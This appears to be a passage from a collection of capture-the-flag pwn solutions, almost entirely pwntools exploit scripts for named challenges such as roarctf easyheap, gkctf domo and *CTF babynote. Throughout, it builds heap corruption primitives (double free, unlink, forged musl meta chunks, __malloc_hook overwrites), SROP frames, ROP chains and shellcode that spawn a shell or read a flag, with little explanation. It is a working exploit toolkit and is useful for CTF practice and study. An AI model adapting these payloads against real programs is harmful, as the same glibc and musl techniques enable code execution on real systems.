frame = SigreturnFrame()
frame.rax = 0
frame.rdi = 0
frame.rsi = stack_addr
frame.rdx = 0x14
frame.rsp = stack_addr + 4 + 8
frame.rip = 0x4000be

payload = p64(0x4000b0) + p64(0x4000be) + bytes(frame)
p.send(payload)
sleep(1)
p.send(p64(0x4000be) + b'\x00' * 7)
sleep(1)
p.send(b'/bin/sh\x00' + b'\x00' * 4 + p64(0x4000b0))

frame = SigreturnFrame()
frame.rax = 0x3b
frame.rdi = stack_addr
frame.rsi = 0
frame.rdx = 0
frame.rip = 0x4000be

sleep(1)
payload = p64(0x4000b0) + p64(0x4000be) + bytes(frame)
p.send(payload)
sleep(1)
p.send(p64(0x4000be) + b'\x00' * 7)
p.interactive()
```





##### roarctf_2019_easyheap

```python
from pwn import*
elf = ELF('roarctf_2019_easyheap')
libc = ELF('libc-2.23.so')
#p = process('./roarctf_2019_easyheap')
p = remote('node4.buuoj.cn',27865)
context.log_level = 'debug'
p.sendafter(b'username:', p64(0) + p64(0x51))
p.sendlineafter(b'info:', p64(0) * 2 + p64(0) + p64(0x71))

def add(size, content):
    p.sendlineafter(b'>>', b'1')
    p.sendlineafter(b'size', str(size).encode())
    p.sendafter(b'content', content)
def delete():
    p.sendlineafter(b'>>', b'2')
def show():
    p.sendlineafter(b'>>', b'3')
def gift(chose, content=b''):
    p.sendlineafter(b'>>', b'666')
    p.sendlineafter(b'?', str(chose).encode())
    if chose == 1:
        p.sendafter(b'content', content)

ptr = 0x602088
gift(1, b'a')
add(0x70, b'a')
add(0x10, b'a')
gift(2)
add(0x30, b'a')
add(0x30, p64(0) + p64(0x41))
#double free
delete()
gift(2)
delete()
add(0x30, b'\x50')
add(0x30, b'a')
add(0x30, p64(0))
add(0x30, p64(0) * 5 + p64(0xb1))
#unlink
p.sendlineafter(b'>>', b'666')
gift(1, p64(0) + p64(0xa1))
delete()
payload = p64(0) + p64(0x21) + p64(ptr - 0x18) + p64(ptr - 0x10) + p64(0x20) + p64(0xb0)
add(0x30, payload)
delete()
gift(2)

delete()
payload = p64(0) * 3 + p64(0x602070) + p64(0xdeadbeefdeadbeef)
add(0x40, payload)
delete()

gift(1, b'a')
gift(2)
add(0x60, b'\x38')
show()
leak = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
malloc_hook = leak - 296
libcbase = malloc_hook - libc.sym['__malloc_hook']
libc_realloc = libcbase + libc.sym['__libc_realloc']
one_gadget = libcbase + 0xf1147
#add(0x60, b'a')
#

p.sendline(b'1')
p.sendline(str(0x60).encode())
p.sendline(b'a')

p.sendline(b'2')

p.sendline(b'666')
p.sendline(b'2')

p.sendline(b'2')

p.sendline(b'1')
p.sendline(str(0x60).encode())
p.sendline(p64(malloc_hook - 0x23))

p.sendline(b'1')
p.sendline(str(0x60).encode())
p.sendline(b'a')

p.sendline(b'1')
p.sendline(str(0x60).encode())
p.sendline(b'a')

p.sendline(b'1')
p.sendline(str(0x60).encode())
payload = b'\x00' * 11 + p64(one_gadget) + p64(libc_realloc + 20)
p.sendline(payload)

p.sendline(b'666')
#gdb.attach(p)
#pause()
p.sendline(b'1')
#gdb.attach(p)
#pause()
p.interactive()
```





##### gkctf_girlfriend_simulator

```python
from pwn import*
elf = ELF('girlfriend')
libc = elf.libc
p = process('./girlfriend')

p.sendlineafter(b'want ?', b'16')

def add(size, content):
    p.sendlineafter(b'>>', b'1')
    p.sendlineafter(b'size?', str(size).encode())
    p.sendafter(b'content:', content)
def delete():
    p.sendlineafter(b'>>', b'2')
def show():
    p.sendlineafter(b'>>', b'3')

for i in range(0xf):
    add(0x10, b'a')
    p.sendlineafter(b'>>', b'5')
add(0x60, b'a')
delete()
p.sendlineafter(b'>>', b'5')
p.recvuntil(b'0x')
leak = int(p.recv(12), 16)
libcbase = leak - libc.sym['_IO_2_1_stdout_']
print(hex(libcbase))
malloc_hook = libcbase + libc.sym['__malloc_hook']
libc_realloc = libcbase + libc.sym['__libc_realloc']
one_gadegt = libcbase + 0xf03a4

p.sendafter(b'girlfriend', p64(malloc_hook - 0x23))
p.sendafter(b'words', b'a')
payload = b'\x00' * 11 + p64(one_gadegt) + p64(libc_realloc + 12)
#gdb.attach(p)
#pause()
p.sendafter(b'Questionnaire', payload)
#pause()
p.interactive()
```





##### gkctf_domo

```python
from pwn import*
elf = ELF('domo')
libc = ELF('libc.so.6')
#p = process('./domo')
p = remote('node4.buuoj.cn',29251)
#context.log_level = 'debug'

def add(size, content):
    p.sendlineafter(b'>', b'1')
    p.sendlineafter(b'size:', str(size).encode())
    p.sendafter(b'content:', content)
def delete(index):
    p.sendlineafter(b'>', b'2')
    p.sendlineafter(b'index:', str(index).encode())
def show(index):
    p.sendlineafter(b'>', b'3')
    p.sendlineafter(b'index:', str(index).encode())
def edit(addr, num):
    p.sendlineafter(b'>', b'4')
    p.sendlineafter(b'addr:', str(addr).encode())
    p.sendafter(b'num:', num)

add(0x80, b'a')
add(0x18, b'a')
add(0x120, b'\x00' * 0xf0 + p64(0) + p64(0x31))
delete(0)
delete(1)
add(0x18, b'a' * 0x10 + p64(0xb0))
delete(2)
add(0x80, b'a')
show(0)
leak = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
libcbase = leak - 88 - 0x10 - libc.sym['__malloc_hook']
IO_list_all = libcbase + libc.sym['_IO_list_all']
setcontext = libcbase + libc.sym['setcontext']
pop_rdi = libcbase + 0x21102
pop_rsi = libcbase + 0x202e8
pop_rdx = libcbase + 0x1b92
pop_rax = libcbase + 0x33544
ret = pop_rax + 1
syscall_ret = libcbase + 0xbc375

print(hex(libcbase))
add(0x10, b'a')
add(0x10, b'a')
delete(3)
delete(2)
show(0)
p.recvuntil(b'\n')
heap_addr = u64(p.recvuntil(b'\n', drop=True).ljust(8, b'\x00'))

add(0x10, b'a')
add(0x10, b'a')
delete(2)
delete(3)
delete(0)
add(0x10, p64(IO_list_all - 0x18))
edit(IO_list_all - 0x10, b'\x21')
add(0x10, b'a')
add(0x10, b'a')
fake_addr = heap_addr + 0x140
add(0x10, p64(0) + p64(fake_addr))

fake_IO_FILE = p64(0) * 5 + p64(1)
fake_IO_FILE = fake_IO_FILE.ljust(0x88, b'\x00')
fake_IO_FILE += p64(heap_addr)             #_lock
fake_IO_FILE = fake_IO_FILE.ljust(0xa0, b'\x00')
fake_IO_FILE += p64(fake_addr + 0x130) + p64(ret)
fake_IO_FILE = fake_IO_FILE.ljust(0xd8, b'\x00')
fake_IO_FILE += p64(fake_addr + 0xe0)
fake_IO_FILE += b'/flag'.ljust(8, b'\x00') + p64(0) * 2 + p64(setcontext + 53)

payload = flat(
    p64(pop_rdi), p64(fake_addr + 0xe0),
    p64(pop_rsi), p64(0),
    p64(pop_rax), p64(2),
    p64(syscall_ret),

    p64(pop_rdi), p64(3),
    p64(pop_rsi), p64(fake_addr),
    p64(pop_rdx), p64(0x30),
    p64(pop_rax), p64(0),
    p64(syscall_ret),

    p64(pop_rdi), p64(1),
    p64(pop_rsi), p64(fake_addr),
    p64(pop_rdx), p64(0x30),
    p64(pop_rax), p64(1),
    p64(syscall_ret),
)

add(0x120, fake_IO_FILE)
add(0x120, payload)
print(hex(setcontext + 53))
#gdb.attach(p)
#pause()
p.sendlineafter(b'>', b'5')
#pause()
p.interactive()
```



##### awd_docker(防灾科技学院)

```python
from pwn import*
elf = ELF('pwn')
#libc = elf.libc
#p = process('./pwn')
p = remote('127.0.0.1', 9999)

bss = 0x6020a0
pop_rdi = 0x400ec3
pop_rsi_r15 = 0x400ec1

p.sendlineafter(b'calculations:', b'100')
def sendgadget(x):
    p.sendlineafter(b'operation:', b'1')
    p.sendlineafter(b'Please input x:', str(x).encode())
    p.sendlineafter(b'Please input y:', b'0')
    p.sendlineafter(b'operation:', b'6')

for i in range(62):
    p.sendlineafter(b'operation:', b'6')

sendgadget(pop_rdi)
sendgadget(0)
sendgadget(pop_rsi_r15)
sendgadget(bss)
sendgadget(0)
sendgadget(elf.plt['read'])
sendgadget(pop_rdi + 1)
sendgadget(pop_rdi)
sendgadget(bss)
sendgadget(elf.plt['system'])
p.sendlineafter(b'operation:', b'5')
#pause()
p.send(b'/bin/sh\x00')
#pause()
p.interactive() 
```



##### ycb_2020_babypwn

```python
from pwn import*
elf = ELF('ycb_2020_babypwn')
libc = ELF('libc-2.23.so')
global p
context.log_level = 'debug'

def add(size, name, message):
    p.sendlineafter(b':', b'1')
    p.sendlineafter(b':', str(size).encode())
    p.sendafter(b':', name)
    p.sendlineafter(b':', message)

def delete(idx):
    p.sendlineafter(b':', b'2')
    p.sendlineafter(b':', str(idx).encode())

def pwn():
    add(0x60, b'a', p64(0) + p64(0x71))
    p.sendlineafter(b':', b'1')
    p.sendlineafter(b':', str(0x90).encode())
    p.sendlineafter(b':', b'1')
    p.sendlineafter(b':', str(0x90).encode())
    p.sendlineafter(b':', b'1')
    p.sendlineafter(b':', str(0x90).encode())
    add(0x60, b'a', b'a')
    delete(1)
    delete(0)
    delete(1)

    add(0x60, b'\x20', b'a')
    add(0x60, b'a', b'a')
    add(0x60, b'a', b'a')
    add(0x60, p64(0) + p64(0x1a1), b'a')

    delete(0)
    add(0x60, b'a', b'a')   #6
    delete(1)
    add(0x20, b'a', b'a')   #7
    add(0x30, b'\xdd' + b'\x95', p64(0) + p64(0x31))
    add(0x20, b'a', b'a')
    delete(0)
    delete(7)
    delete(0)
    delete(9)
    add(0x20, b'\x50', b'a')
    
    p.sendlineafter(b':', b'1')
    p.sendlineafter(b':', str(0x90).encode())
    add(0x20, p64(0) + p64(0x71), b'a')
    add(0x60, b'a', b'a')   #12

    payload = b'\x00' * 0x33 + p64(0xfbad1800) + p64(0) * 3 + b'\x00'
    p.sendlineafter(b':', b'1')
    p.sendlineafter(b':', str(0x60).encode())
    p.sendafter(b':', payload)
    
    leak = u64(p.recvuntil(b'\x7f', timeout=1)[-6:].ljust(8, b'\x00'))
    libcbase = leak + 0x20 - libc.sym['_IO_2_1_stdout_']
    print(hex(libcbase))
    one_gadget = libcbase + 0x4526a
    malloc_hook = libcbase + libc.sym['__malloc_hook']
    libc_realloc = libcbase + libc.sym['__libc_realloc']

    p.sendlineafter(b':', b'a')
    add(0x60, b'a', b'a')   #14
    delete(14)
    delete(12)
    delete(14)
    add(0x60, p64(malloc_hook - 0x23), b'a')
    add(0x60, b'a', b'a')
    add(0x60, b'a', b'a')

    payload = b'\x00' * 11 + p64(one_gadget) + p64(libc_realloc + 12)
    add(0x60, payload, b'a')
    #gdb.attach(p)
    #pause()
    p.sendlineafter(b':', b'1')
    p.interactive()
    #gdb.attach(p)

#p = process('./ycb_2020_babypwn')
#pwn()

while True:
    try:
        #p = process('./ycb_2020_babypwn')
        p = remote('node4.buuoj.cn',26847)
        pwn()
    except Exception as e:
        p.close()

```



##### 2020 XCTF  musl-master



```python
from pwn import*
elf = ELF('carbon')
libc = elf.libc
p = process('./carbon')
context.log_level = 'debug'

def add(size, content, m = b'a'):
    p.sendlineafter(b'>', b'1')
    p.sendlineafter(b'>', str(size).encode())
    p.sendlineafter(b'>', m)
    p.sendafter(b'>', content)
def delete(index):
    p.sendlineafter(b'>', b'2')
    p.sendlineafter(b'>', str(index).encode())
def edit(index, content):
    p.sendlineafter(b'>', b'3')
    p.sendlineafter(b'>', str(index).encode())
    p.send(content)
def show(index):
    p.sendlineafter(b'>', b'4')
    p.sendlineafter(b'>', str(index).encode())


add(0x1, b'a')
show(0)
leak = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
libc_base = leak - 0x96e61
stdin = libc_base + libc.sym['__stdin_FILE']
sys_addr = libc_base + libc.sym['system']
bin_sh = libc_base + libc.search(b'/bin/sh\x00').__next__()
mal = libc_base + libc.sym['mal']
brk = libc_base + 0x99030
print(hex(libc_base))
add(0x10, b'\n')
add(0x10, b'\n')    #2
add(0x10, b'\n')    #3
add(0x10, b'\n')    #4
add(0x10, b'\n')    #5
add(0x10, b'\n')    #6
add(0x10, b'\n')    #7

delete(0)
delete(2)
bin = libc_base + 0x96e38

payload = p64(0) * 2 + p64(0x21) * 2 + p64(0) * 2 + p64(0x21) + p64(0x20) + p64(stdin - 0x10) * 2 + p8(0x20)
add(0x10, payload + b'\n', b'Y')
add(0x10, b'a' * 0x10)
delete(0)

edit(2, p64(mal - 0x20) * 2)
add(0x10, b'\n')
delete(4)

edit(2, p64(brk - 0x10) * 2)
add(0x10, b'\n')
delete(6)

edit(2, p64(stdin - 0x10) + p64(bin))
add(0x10, b'\n')
payload = b'/bin/sh\x00' + p64(0) * 4 + p64(1) + p64(0) * 3 + p64(sys_addr)
add(0x50, payload)

edit(2, p64(brk - 0x10) + p64(bin))
add(0x10, b'\n')
add(0x50, p64(0xbadbeef - 0x20) + b'\n')

edit(2, p64(mal - 0x20) + p64(bin))
add(0x10, b'\n')
add(0x50, p64(0) * 3 + b'\n')

p.sendlineafter(b'>', b'1')
gdb.attach(p)
pause()
p.sendlineafter(b'>', b'0')
pause()
p.interactive()
```





##### xyb2021 babymull

```python
from pwn import*
elf = ELF('babymull')
libc = elf.libc
p = process('./babymull')
context.log_level = 'debug'
context.arch = 'amd64'

def add(size, content, name = b'a'):
    p.sendlineafter(b'>>', b'1')
    p.sendafter(b'Name:', name)
    p.sendlineafter(b'Size:', str(size).encode())
    p.sendafter(b'Content:', content)
def delete(index):
    p.sendlineafter(b'>>', b'2')
    p.sendlineafter(b'Index:', str(index).encode())
def show(index):
    p.sendlineafter(b'>>', b'3')
    p.sendlineafter(b'Index:', str(index).encode())

def gift(set_null, leak):
    p.sendlineafter(b">>", str(0x73317331).encode())
    p.sendline(str(set_null).encode())
    p.sendline(str(leak).encode())


for i in range(5):
    add(0x20, b'a' * 0x10 + b'\n')

delete(0)
add(0x1000, b'\n')
add(0x1000, b'\x00' * 0x238 + p32(5) + b'\n', b'a' * 0xf)
show(5)
leak = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
libc_base = leak + 0x2aa0

mmap_addr = libc_base - 0x4000
stdin = libc_base + libc.sym['__stdin_FILE']
stdout = libc_base + libc.sym['__stdout_FILE']
malloc_context = libc_base + libc.sym['__malloc_context']
gadget = libc_base + 0x4bcf3
pop_rdi_ret = libc_base + 0x15536
pop_rsi_ret = libc_base + 0x1b3a9
pop_rdx_ret = libc_base + 0x177c7
ret = pop_rdi_ret + 1
print(hex(libc_base))

gift(leak - 8 + 6, malloc_context)
p.recvuntil(b'0x')
secret = int(p.recv(16), 16)

delete(0)
fake_meta = mmap_addr + 0x1000 + 8
fake_group = mmap_addr + 0x550

payload = b'\x00' * 0x520 + p64(fake_meta)
payload = payload.ljust(0xfd0, b'\x00')
payload += p64(secret)
payload += p64(0) + p64(0)
payload += p64(fake_group)
payload += p64(0)
payload += p64((24 << 6) + 1)
add(0x1000, payload)
delete(5)

delete(0)
payload = b'\x00' * 0xfc0 + p64(secret) + p64(mmap_addr + 0x1008) * 2 + p64(stdout - 0x20) + p64(3) + p64((24 << 6) + 1)
add(0x1000, payload + b'\n')

libc.address = libc_base
payload = flat([
    pop_rdi_ret, mmap_addr + 0x2000,
    pop_rsi_ret, 0x1000,
    pop_rdx_ret, 7,
    libc.sym['mprotect'],
    mmap_addr + 0x2aa0 + 0x40
])
payload += asm(shellcraft.open('/flag') + shellcraft.read('rax', mmap_addr, 0x30) + shellcraft.write(1, mmap_addr, 0x30))
add(0x1000, payload + b'\n')

payload = p64(0) * 4 + p64(1) + p64(1) + p64(mmap_addr + 0x2aa0) + p64(ret) + p64(0) + p64(gadget) + b'\n'
p.sendlineafter(b'>>', b'1')
p.sendafter(b'Name:', b'a')
p.sendlineafter(b'Size:', str(0x800).encode())

#gdb.attach(p)
#pause()
p.sendafter(b'Content:', payload)
#pause()
p.interactive()
```





##### CATCTF HRPVM

```python
from pwn import*
elf = ELF('HRPVM')
libc = elf.libc
p = process('./HRPVM')
#context.log_level = 'debug'

p.sendlineafter(b'NAME:', b'HRPHRP')
p.sendlineafter(b'PASSWORD:', b'PWNME')
p.sendlineafter(b'HOLDER:', b'aaaa')

for i in range(0x20):
    p.sendlineafter(b'HRP-MACHINE$', b'file')
    p.sendlineafter(b'FILE NAME:', str(i).encode())
    p.sendlineafter(b'FILE CONTENT:', str(i).encode())


p.sendlineafter(b'HRP-MACHINE$', b'file')
p.sendlineafter(b'FILE NAME:', b'32')
p.sendlineafter(b'FILE CONTENT:', b'mov rdi,35;mov rsi,0;call open,2')
p.sendlineafter(b'HRP-MACHINE$', b'./32')
p.sendlineafter(b'HRP-MACHINE$', b'DEBUG')
p.sendlineafter(b'root#', b'file input')
p.sendlineafter(b'FILE NAME:', b'flag')
p.sendlineafter(b'root#', b'mmap')

p.sendlineafter(b'ADDR EXPEND:', str(0x233000).encode())
p.sendlineafter(b'root#', b'exit')
p.sendlineafter(b'HRP-MACHINE$', b'reboot')

p.sendlineafter(b'NAME:', b'HRPHRP')
p.sendlineafter(b'PASSWORD:', b'PWNME')
p.sendlineafter(b'HOLDER:', p64(0x233000))

p.sendlineafter(b'HRP-MACHINE$', b'file')
p.sendlineafter(b'FILE NAME:', b'33')
p.sendlineafter(b'FILE CONTENT:', b'mov rdi,37;mov rsi,1001;call open,2')
p.sendlineafter(b'HRP-MACHINE$', b'./33')

p.interactive()
```



##### WMCTF2021 Nescafe



```python
from pwn import*
elf = ELF('pwn')
libc = elf.libc
p = process('./pwn')
context.log_level = 'debug'
context.arch = 'amd64'

def add(content):
    p.sendlineafter(b'>>', b'1')
    p.sendlineafter(b'content', content)
def delete(index):
    p.sendlineafter(b'>>', b'2')
    p.sendlineafter(b'idx:', str(index).encode())
def show(index):
    p.sendlineafter(b'>>', b'3')
    p.sendlineafter(b'idx', str(index).encode())
def edit(index, content):
    p.sendlineafter(b'>>', b'4')
    p.sendlineafter(b'idx:', str(index).encode())
    p.sendlineafter(b'Content', content)

add(b'aaa')
delete(0)
show(0)
leak = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
#libc_base = leak - 0x292c40
libc_base = leak - 0x292e50
heap_addr = libc_base + 0x2953c0
stdin = libc_base + libc.sym['__stdin_FILE']
gadget = libc_base + 0x4951a
pop_rdi_ret = libc_base + 0x14862
pop_rsi_ret = libc_base + 0x1c237
pop_rdx_ret = libc_base + 0x1bea2
ret = pop_rdi_ret + 1
bin = leak
print(hex(libc_base))

edit(0, p64(stdin - 0x10) * 2)
add(b'aaa')
delete(0)
edit(0, p64(stdin - 0x10) + p64(bin))

libc.address = libc_base
payload = b'\x00' * 0x10  + flat([
    pop_rdi_ret, heap_addr & 0xfffffffffffff000,
    pop_rsi_ret, 0x1000,
    pop_rdx_ret, 7,
    libc.sym['mprotect'],
    heap_addr + 0x50
])
payload += asm(shellcraft.cat('/flag'))
add(payload)
delete(0)

# payload = p64(0) + p64(0) * 4 + p64(0) + p64(heap_addr + 0x10) + p64(ret) + p64(0) + p64(gadget)
# payload = payload.ljust(0x100, b'\x00')
# payload += p64(0) * 9 + p64(libc.sym['exit'])
payload = b'\x00' * 0x100 + p64(0) * 4 + p64(1) * 2 + p64(heap_addr + 0x10) + p64(ret) + p64(0) + p64(gadget)
p.sendlineafter(b'>>', b'1')
gdb.attach(p)
pause()
p.sendlineafter(b'content', payload)
pause()
p.interactive()
```



```python
from pwn import*
elf = ELF('pwn')
libc = elf.libc
p = process('./pwn')
context.log_level = 'debug'
context.arch = 'amd64'

def add(content):
    p.sendlineafter(b'>>', b'1')
    p.sendafter(b'content', content)
def delete(index):
    p.sendlineafter(b'>>', b'2')
    p.sendlineafter(b'idx:', str(index).encode())
def show(index):
    p.sendlineafter(b'>>', b'3')
    p.sendlineafter(b'idx', str(index).encode())
def edit(index, content):
    p.sendlineafter(b'>>', b'4')
    p.sendlineafter(b'idx:', str(index).encode())
    p.sendafter(b'Content', content)


add(b'a' * 8)
show(0)
leak = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
#libc_base = leak - 0x292c40
libc_base = leak - 0x292e50
heap_addr = libc_base + 0x2953c0
stdin = libc_base + libc.sym['__stdin_FILE']
#gadget = libc_base + 0x4951a
pop_rdi_ret = libc_base + 0x14862
pop_rsi_ret = libc_base + 0x1c237
pop_rdx_ret = libc_base + 0x1bea2
ret = pop_rdi_ret + 1
environ = libc_base + 0x294fd8
bin = libc_base + 0x292e10
print(hex(libc_base))

add(b'a')
delete(0)
edit(0, p64(bin - 0x10) * 2)
add(b'aaa')

add(b'\x00' * 0x68 + b'\x30')
add(p64(0) * 6)
show(0)
p.recvuntil(b'\n')
elf_base = u64(p.recvuntil(b'\n', drop=True).ljust(8, b"\x00")) - 0x202040
print(hex(elf_base))

payload = p64(elf_base + 0x202040) + p64(environ) + p64(0) * 4
edit(0, payload)
show(1)
stack_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - 0x70
print(hex(stack_addr))

payload = p64(stack_addr) + p64(elf_base + 0x202040)
payload += asm(shellcraft.cat('/flag'))
edit(0, payload)
gdb.attach(p)
pause()

payload = flat([
    pop_rdi_ret, elf_base + 0x202000,
    pop_rsi_ret, 0x1000,
    pop_rdx_ret, 7,
    libc_base + libc.sym['mprotect'],
    elf_base + 0x202050
])
edit(0, payload)
pause()
p.interactive()
```



##### *CTF 2022 babynote



```python
from pwn import*
elf = ELF('babynote')
libc = elf.libc
p = process('./babynote')
context.log_level = 'debug'

def add(size0, content0, size1, content1):
    p.sendlineafter(b'option:', b'1')
    p.sendlineafter(b'size:', str(size0).encode())
    p.sendafter(b'name:', content0)
    p.sendlineafter(b'size:', str(size1).encode())
    p.sendafter(b'content:', content1)
def find(size, content):
    p.sendlineafter(b'option:', b'2')
    p.sendlineafter(b'size:', str(size).encode())
    p.sendafter(b'name:', content)
def delete(size, content):
    p.sendlineafter(b'option:', b'3')
    p.sendlineafter(b'size:', str(size).encode())
    p.sendafter(b'name:', content)

for _ in range(10):
    add(0x200, b'aaaaaaaa\n', 0x200, b'a\n')

add(0x38, b'a' * 0x38, 0x38, b'a' * 0x38)
p.sendlineafter(b'option:', b'4')

for _ in range(8):
    find(0x20, b'a\n')

add(0x38, b'b' * 0x38, 0x28, b'b' * 0x28)
add(0x38, b'c' * 0x38, 0x38, b'c' * 0x38)
delete(0x38, b'b' * 0x38)
for _ in range(6):
    find(0x20, b'a\n')
add(0x38, b'd' * 0x38, 0x200, b'd\n')
find(0x38, b'b' * 0x38)
p.recvuntil(b'0x28:')

elf_base = 0
for i in range(8):
    elf_base += int(p.recv(2), 16) << (i * 8)
elf_base -= 0x7d10
libc_base = 0
for i in range(8):
    libc_base += int(p.recv(2), 16) << (i * 8)
libc_base += 0x1d90
stdin = libc_base + 0xad180
stdout = stdin + 0x100
sys_addr = libc_base + libc.sym['system']
malloc_context = libc_base + 0xad9c0
# print(hex(elf_base))
# print(hex(libc_base))

for _ in range(6):
    find(0x20, b'a\n')

payload = p64(elf_base + 0x4fc0) + p64(malloc_context) + p64(0x38) + p64(0x28)
find(0x20, payload)
find(0x38, b'b' * 0x38)
p.recvuntil(b'0x28:')
secret = 0
for i in range(8):
    secret += int(p.recv(2), 16) << (i * 8)

heap_addr = libc_base - 0x6000
fake_meta = heap_addr + 0x1008
fake_group = heap_addr + 0x1040
last_idx, freeable, sc, maplen = 0, 1, 8, 1
payload = b'\x00' * (0x1000 - 0x40) 
payload += p64(secret) + p64(0) + p64(0) + p64(fake_group) + p64(0) 
payload += p64((sc << 6) + 1) + p64(0) + p64(0)
payload += p64(fake_meta) + p32(1) + p32(0)
payload += b'\x00' * (0x80 + 0x90) + p64(0) + p32(5)
add(0x20, b'e' * 0x20, 0x1200, payload + b'\n')

for _ in range(3):
    find(0x20, b'a' * 0x20)

payload = p64(elf_base + 0x5fc0) + p64(fake_group + 0x10) + p64(0x38) + p64(0x28)
add(0x38, b'f' * 0x38, 0x20, payload)
delete(0x38, b'a' * 0x38)

payload = b'\x00' * (0x1000 - 0x580) + p64(secret) + p64(0) * 2 + p64(stdin - 0x10)
payload += p32(0) + p32(3) + p64((sc << 6) + 1) + p64(0) + p64(0)
# payload += p64(fake_meta + 0x1000) + p32(1) + p32(0)
# payload += b'\x00' * (0x80 + 0x90) + p64(0) + p32(5)
add(0x38, b'g' * 0x38, 0x1200, payload + b'\n')
delete(0x20, b'e' * 0x20)


payload = b'\x00' * (0x1000 - 0x50) 
payload += p64(secret) + p64(stdin - 0x18) + p64(heap_addr + 0x2008) + p64(fake_group) + p32(2) + p32(0)
payload += p64((1 << 12)|(sc << 6)| (1 << 5) | 1) + p64(fake_group - 0x10) + p64(0)
payload += p64(fake_meta) + p32(1) + p32(0)
payload += b'\x00' * (0x80 + 0x90) + p64(0) + p32(5)
find(0x1200, payload + b'\n')

payload = p64(elf_base + 0x6fb0) + p64(fake_group + 0x10) + p64(0x38) + p64(0x28)
add(0x38, b'h' * 0x38, 0x20, payload)

delete(0x38, b'a' * 0x38)

payload = b'/bin/sh\x00' + p64(0) * 6 + p64(1)  + p64(0) + p64(sys_addr)

add(0x38, b'a' * 0x38, 0x80, payload + b'\n')

#gdb.attach(p)
#pause()
p.sendlineafter(b'option:', b'5')
#pause()
p.interactive()
```



##### nkctf note

```python
from pwn import*
elf = ELF('nk_note')
libc = elf.libc
p = process('./nk_note')
context.log_level = 'debug'

def add(index, size, content):
    p.sendlineafter(b'choice:', b'1')
    p.sendlineafter(b'Index:', str(index).encode())
    p.sendlineafter(b'Size:', str(size).encode())
    p.sendlineafter(b'Content', content)
def edit(index, size, content):
    p.sendlineafter(b'choice:', b'2')
    p.sendlineafter(b'Index:', str(index).encode())
    p.sendlineafter(b'Size:', str(size).encode())
    p.sendafter(b'Content', content)
def delete(index):
    p.sendlineafter(b'choice:', b'3')
    p.sendlineafter(b'Index:', str(index).encode())
def show(index):
    p.sendlineafter(b'choice:', b'4')
    p.sendlineafter(b'Index:', str(index).encode())


for i in range(4):
    add(i, 0x7e0, b'/bin/sh\x00')

edit(16, 0x10, b'a' * 0x10)
show(16)
p.recvuntil(b'a' * 0x10)
leak = u64(p.recv(6).ljust(8, b'\x00'))
elf.address = leak - 0x4120
print(hex(elf.address))

edit(3, 0x10, p64(elf.got['puts']) + p64(elf.got['free']))
show(18)
leak = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
libc.address = leak - libc.sym['puts']
print(hex(libc.address))

edit(19, 8, p64(libc.sym['system']))
delete(0)
p.interactive()
```



##### 鹏城杯_2018_treasure

```python
from pwn import*
elf = ELF('2018_treasure')
libc = elf.libc
#p = process('./2018_treasure')
p = remote('node4.buuoj.cn',29139)
context.log_level = 'debug'
context.arch = 'amd64'

pop_rdi_ret = 0x400b83
ret = pop_rdi_ret + 1

p.sendlineafter(b':', b'y')
shellcode = asm('''
    mov esi, 0x601f00;
    syscall;
    ret
''')

p.sendline(shellcode)
p.send(b'\n')

p.sendlineafter(b':', b'y')
shellcode = asm('''
    mov esi, 0x601018;
    syscall;
    ret
''')
p.sendline(shellcode)
libc_base = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - libc.sym['puts']
print(hex(libc_base))
libc.address = libc_base

p.sendlineafter(b':', b'y')
shellcode = asm('''
    xor rax, rax;
    ret
''')
p.sendline(shellcode)

p.sendlineafter(b':', b'y')
shellcode = asm('''
    mov esi, 0x601a00;
    syscall;
    ret
''')
p.sendline(shellcode)
payload = p64(ret) * 2 + p64(pop_rdi_ret) + p64(0x601a28) + p64(libc.sym['system']) + b'/bin/sh\x00'
p.sendline(payload)


p.sendlineafter(b':', b'y')
shellcode = asm('''
    mov rsp, 0x601a00;
    ret
''')

p.sendline(shellcode)
p.interactive()
```



##### NCTF2022 ezshellcode

```python
from pwn import*
elf = ELF('pwn')
p = process('./pwn')
context.log_level = 'debug'
context.arch = 'amd64'

r = process('./pwn')
r.recvuntil(b'Pid: ')
pid = int(r.recvuntil(b'\n', drop=True))

shellcode = shellcraft.ptrace(16, pid, 0, 0)
shellcode += shellcraft.ptrace(24, pid, 0, 0)
shellcode += shellcraft.wait4(pid, 0, 0)
shellcode += shellcraft.ptrace(12, pid, 0, 0x401500)
shellcode += '''
    mov r9, 0x401000
    mov r8, 0x401500
    mov r11, qword ptr [r8+0x78]
    mov r12, 0
    cmp r11, r12
    je loop
    mov qword ptr [r8+0x80], r9
'''
shellcode += shellcraft.ptrace(13, pid, 0, 0x401500) + shellcraft.ptrace(17, pid, 0, 0)
shellcode += '''
loop:
    mov r13, 0x401013
    jmp r13
'''

#gdb.attach(p)
#pause()
p.sendafter(b'\n', asm(shellcode))
#pause()
r.sendline(asm(shellcraft.sh()))

r.interactive()
```



##### NCTF babyLinkedList

```python
from pwn import*
elf = ELF('babyLinkedList')
libc = elf.libc
p = process('./babyLinkedList')
context.log_level = 'debug'

def add(size, content):
    p.sendlineafter(b'>>', b'1')
    p.sendlineafter(b'size', str(size).encode())
    p.sendafter(b'content', content)

def delete():
    p.sendlineafter(b'>>', b'2')

def show():
    p.sendlineafter(b'>>', b'3')

def edit(content):
    p.sendlineafter(b'>>', b'4')
    p.send(content)

add(0x18, b'a' * 0x18)
edit(b'a' * 0x20)
show()
leak = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
libc_base = leak - 0xa6cc0
libc.address = libc_base
print(hex(libc_base))

edit(b'a' * 0x20 + p64(leak + 0x20))
edit(p64(libc.sym['__stdout_FILE']) + p64(0) + p64(0x70))
payload = b'/bin/sh\x00' + p64(0) * 3 + p64(1) * 2 + p64(0) * 3 + p64(libc.sym['system']) 
edit(payload)
p.interactive()
```



##### corctf 2022

```python
from pwn import*
elf = ELF('babypwn')
libc = elf.libc
p = process('./babypwn')
#context.log_level = 'debug'
